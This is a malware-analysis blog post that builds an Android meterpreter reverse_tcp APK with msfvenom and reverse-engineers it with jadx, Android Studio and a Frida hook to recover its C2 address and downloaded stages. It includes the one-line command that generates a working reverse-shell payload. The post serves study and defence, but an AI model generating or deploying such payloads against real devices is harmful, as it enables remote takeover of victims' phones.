---
title: "Analyzing MSFVenom Android Payload (Malware)"
date: "2022-05-04T09:11:56+02:00"
author: "Kousha Zanjani"
image: https://github.com/user-attachments/assets/2ffd49bd-a909-4d75-9e27-738c0203d4d7
description: MSFVenom is a versatile and widely used tool for generating payloads and shellcodes as part of the Metasploit Framework. It allows users to create customized payloads for various platforms, including Android, for penetration testing purposes. I want to analyze a bit of MSFVenom Android payload to better understand its structure and how it can be used to exploit vulnerabilities in Android devices.
showFullContent: false
tags: ["Android", "Malware", "MalwareAnalysis", "ReverseEngineering", "MSFVenom", "Metasploit"]
keywords: ["Android", "Malware", "MalwareAnalysis", "ReverseEngineering", "MSFVenom", "Metasploit"]
readingTime: true
---

MSFVenom is one of the most popular frameworks to create payloads, shellcodes, etc. I want to analyze a little bit of MSFVenom Android payload. So
<p align="center">
<img src="https://user-images.githubusercontent.com/36133745/164783235-d8df38a6-e0f3-4e68-9f64-57fa21b98435.gif">
</p>

## ðŸŽ¬ Part 1 - Creating an Android payload with MSFVenom
Run your Kali Linux distribution (I use vagrant kalilinux/rolling box) and open a terminal.
```bash
# Installing Kali Linux Box
vagrant box add kalilinux/rolling

# Create a Kali Linux VM
mkdir -p /home/$USER/Desktop/vagrantmachines/kali
cd /home/$USER/Desktop/vagrantmachines/kali
vagrant init kalilinux/rolling

# Set Kali Network to Bridge
# Add below line into Vagrantfile file below config.vm.box = "kalilinux/rolling"
  config.vm.network "public_network"
# Save and Exit from Vagrantfile

# Execute Kali Machine
vagrant up

# SSH to Kali Machine
vagrant ssh

# If you want to turn it off just execute the below command after you exit from SSH
vagrant halt
```

Simply execute the below command.
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=$(ip addr show eth0 | grep -Po 'inet \K[\d.]+') LPORT=1337 > malicious.apk
```
* `-p`: choosing payload
* `LHOST`: listener IP address (C2)
* `LPORT`: listener Port number (C2)
* `> malicious.apk`: output of executed command (attacker payload)

After that, I copy **malicious.apk** to `/vagrant` which let me access it from my computer.
```bash
cp malicious.apk /vagrant
```
## ðŸŽ¬ Part 2 - Static Analysis with Jadx-Gui

Now I have **malicious.apk** besides **Vagrantfile**. Let's start with static analysis.
Open it with the **jadx-gui**. Let's see what AndroidManifest.xml does have for us.

![1](https://user-images.githubusercontent.com/36133745/166328267-ec5c9ddb-8230-46af-a575-adfddb1e6d27.png)

We have an activity called `MainActivity` (package: `com.metasploit.stage`) which is our first activity that'll execute.

![2](https://user-images.githubusercontent.com/36133745/166329390-42daa913-cba3-47cf-a4a4-2e2a4c920286.png)

We can also see there is a `BroadcastReceiver` with `android.intent.action.BOOT_COMPLETED` action. It is obvious that this malware use this permission to execute itself after restarting mobile.

![3](https://user-images.githubusercontent.com/36133745/166330015-7593e85c-5e8b-41fc-8b68-32822610297c.png)

Let's have a look at `MainActivity`. It simply calls `startService()` method from `MainService` class.

![4](https://user-images.githubusercontent.com/36133745/166330313-13e44b33-d638-415b-8e96-2b58dd130cce.png)

`MainService` class extended (inherited) from Service, so it's a service that we are dealing with.

![5](https://user-images.githubusercontent.com/36133745/166335467-a7932269-6aeb-466d-b9a2-564b14362811.png)

In this method again `startService` function is called, but as we said we are in a service and it calls `MainService.class` in `Intent()`.
```java
public static void startService(Context context) {
    context.startService(new Intent(context, MainService.class));
}
```

So this time `onStartCommand()` method will call. `onStartCommand()` is called every time a client starts the service using `startService(Intent intent)`.

![6](https://user-images.githubusercontent.com/36133745/166336169-c9477814-cce5-4b93-88a8-65e24d209fd1.png)

This method, calls `start()` from `Payload` class. Now let's go deeper and see what the` start()` method does.

![7](https://user-images.githubusercontent.com/36133745/166661952-7600a5cf-7f6d-439a-9e00-56d015cabfc1.png)

`start()` function calls `startInPath()` function, and `startInPath()` function calls `e().start()` that lead us to analyse that class and method.

![8](https://user-images.githubusercontent.com/36133745/166662358-72e3cd42-f85c-4539-9df1-311b01198ed2.png)

There is nothing but execute the `main()` method from the `Payload` class again. We have to back to where we were and analyze the `main()` function.

![9](https://user-images.githubusercontent.com/36133745/166662629-60f69553-b52f-451d-95b3-54b8dca90517.png)

It's a huge function that can't even fit in one screenshot. We can see there is a `Socket socket` which indicates we are dealing with a socket connection that's probably attacker C2. Also there is a line contains `a a2 = b.a(a);`. It passes `a` variable to `b.a()` method and save results in `a2`. Left-click on the `a` parameter and press `d` on your keyboard (that is a shortcut to get you where the variable is declared).

![10](https://user-images.githubusercontent.com/36133745/166663408-d2ac014a-df8f-429f-aa2c-00d5f090a1e9.png)

It seems a huge array which i guess it can be an IP address or an URL. To make sure of this, I go to `b.a()` method.

![11](https://user-images.githubusercontent.com/36133745/166663788-8a4c2e27-2b9d-4e75-b698-266b7faf0ef0.png)

Again it's a huge function, but this is obvious it decrypts that array. I don't want to waste my time and try to understand that algorithm, I'll deal with it in the dynamic analysis part. But we have to figure out where it stores the decrypted data. You can see `gVar` everywhere in this function.

![12](https://user-images.githubusercontent.com/36133745/166664915-cee79b68-cb99-46dd-bc10-af7a29f91f48.png)

If you open the `g` class, you can see there is nothing but a bunch of variables. Now I'm sure it stores the decrypted data in that class's variables.

![13](https://user-images.githubusercontent.com/36133745/166665135-c1c47aa9-a4d6-416a-9abc-cce98874e327.png)

In the `Payload.main()`, after that decryption method, we can see bunch of `while(){}`, `try{}` and `if(){}`.

![14](https://user-images.githubusercontent.com/36133745/166667336-c7e6bacd-461b-497c-864d-919407e9e453.png)

Take a look at where I pointed (ofc with a red arrow).

![15](https://user-images.githubusercontent.com/36133745/166668085-a8945a36-98e1-4715-b294-7dc6957edf14.png)


You can see we have a `socket.getOutputStream()` there that passed to `a()`. If you go to where `a()` declared, you see there's `getClassLoader()`. This method let you load the Dex file dynamically. It uses to bypass AV, and it makes APK file size smaller.

Overall, this APK file connects to attacker C2 (MSFVenom) and downloads a Dex (or JAR) file, loads it and after that, it will be deleted. Now Let's continue our journey in the dynamic analysis part.

## ðŸŽ¬ Part 3 - Dynamic Analysis

For the first step of dynamic analysis, I want to extract the attacker's C2 IP address. As we saw in the static analysis, the decrypted attacker IP address is in the `g` class. Let's dump data from that class. I use **Android Studio** to do this. But an important thing that is worth mentioning is "We have to do this quickly before anything happens and malware closes itself and runs itself as a service" because you saw it creates a service after execution. Make sure your USB Debugging is enabled.

![16](https://user-images.githubusercontent.com/36133745/166671370-f434b2af-8130-4f7c-836b-f10a8b211d5f.png)

But we have to do one thing more before debugging. We have to make this malicious APK debuggable. To do this as easily as possible, I do this with **[APKLab](https://github.com/APKLab/APKLab)**. The installation steps are explained in **[APKLab Github](https://github.com/APKLab/APKLab)**.

Now open the malicious APK file with APKLab, Then Right-click on `apktool.yml` and Left-click on `APKLab: Rebuild the APK`.

![18](https://user-images.githubusercontent.com/36133745/166682924-ea6c990f-9445-48f8-b3f6-fc87a6797b9d.png)

Make sure you check `--debug` in the opened window.

![19](https://user-images.githubusercontent.com/36133745/166684640-e43bd3a3-a131-4dbf-9bb2-887e446cf8ff.png)

The rebuilt APK output file is located in the `dist` folder.

![20](https://user-images.githubusercontent.com/36133745/166685952-ee39eea2-6ed5-4534-8c45-6a972234c966.png)

Use `adb` to install the rebuilt APK file.

```shell
adb install rebuilt-malicious.apk
```

Now let's analyze `g` class memory. Open **Android Studio** and choose **Profile or Debug APK**.

![17](https://user-images.githubusercontent.com/36133745/166672132-90e6ce28-5444-4675-baba-527b93b11960.png)


Now instead of sending 10 images, I would rather make a GIF to show the process how to extract data from the `g` class.
âš ï¸ GIF file size is around 6 Mb, Just in case of any problem you can download the GIF file with [this GIF URL](https://user-images.githubusercontent.com/36133745/166686611-a76ee1b1-6c0f-4115-a942-b707de8118e9.gif) via the `wget`.

![output](https://user-images.githubusercontent.com/36133745/166686611-a76ee1b1-6c0f-4115-a942-b707de8118e9.gif)

OK. We've successfully got the attacker's C2 IP address. Now how we can dump that DEX which is loaded with DexClassLoader. As we know from static analysis, Malware deletes the DEX file after loading it. So we don't have access to that anymore. We have to uninstall malware and install it again, but this time I hook the `delete()` method from `java.io.File` to disable its functionality.

Installing **Frida**

```shell
pip install frida-tools
```

Download the latest version of **frida-server** from [here](https://github.com/frida/frida/releases) that is compatible with your mobile CPU architecture.
Installing **FridaServer** in your mobile.
```shell
adb push frida-server-15.1.17-android-x86.xz /data/local/tmp
adb shell
Mobile #> cd /data/local/tmp
Mobile #> unxz frida-server-15.1.17-android-x86.xz
Mobile #> chmod +x frida-server-15.1.17-android-x86
Mobile #> ./frida-server-15.1.17-android-x86
```

Let's write our hooking code (i named it hook.js) with Frida.

```javascript
Java.perform(function(){
  var filecls = Java.use("java.io.File");
  filecls["delete"].overload().implementation = function(){console.log("delete() hooked!"); return true;}
});
```

Now uninstall `com.metasploit.stage` package.

```shell
adb uninstall com.metasploit.stage
```
And install it again.

```shell
adb install rebuilded-malicious.apk
```

But this time you must use Frida to execute it.

```
frida -Uf com.metasploit.stage -l hook.js --no-pause
```
You can see `File.delete()` hooked 4 times! Then use `adb` to download DEX & JAR files that are downloaded.

![24](https://user-images.githubusercontent.com/36133745/166692009-5604d34d-f4b0-41a4-a3bc-c550a58fb2ea.png)

I go to the `files` folder, there is 4 files.

![25](https://user-images.githubusercontent.com/36133745/166692536-d3f96a35-b69f-4e10-8e33-2a3a859d7f96.png)

I open `xz3z7c.jar` with `jadx-gui`, It downloads `met.jar` and `met.dex`, then it loads `com.metasploit.meterpreter.AndroidMeterpreter`. This class loaded from `met`.

![26](https://user-images.githubusercontent.com/36133745/166693568-80b72f44-28d1-4283-822b-c82cec2512af.png)

Let's open `met.jar` with `jadx-gui`.

![27](https://user-images.githubusercontent.com/36133745/166693934-8227a65c-0d78-4f83-9a34-3a46a10d4c37.png)

It contains a lot of files and functions. It also downloads and loads another **JAR** file. It's beyond of scope to analyze it in just 1 post. :)
Try yourself and have a look at it. Maybe later I wrote the analysis of this **JAR** file.

I hope you learned something.
